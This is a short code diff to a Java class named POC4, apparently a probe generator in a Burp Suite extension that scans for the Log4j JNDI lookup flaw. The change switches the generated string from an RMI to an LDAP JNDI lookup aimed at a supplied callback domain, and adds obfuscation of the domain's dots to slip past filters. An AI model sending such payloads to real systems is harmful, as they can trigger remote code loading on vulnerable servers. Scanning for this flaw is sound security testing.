@@ -5,11 +5,12 @@ import burp.poc.IPOC;
 public class POC4 implements IPOC {
     @Override
     public String generate(String domain) {
-        return "${jndi:rmi://" + domain + "}";
+        domain = domain.replace(".", "${::-.}");
+        return "${jndi:ldap://" + domain + "}";
     }
 
     @Override
     public int getType() {
-        return POC_TYPE_RMI;
+        return POC_TYPE_LDAP;
     }
 }
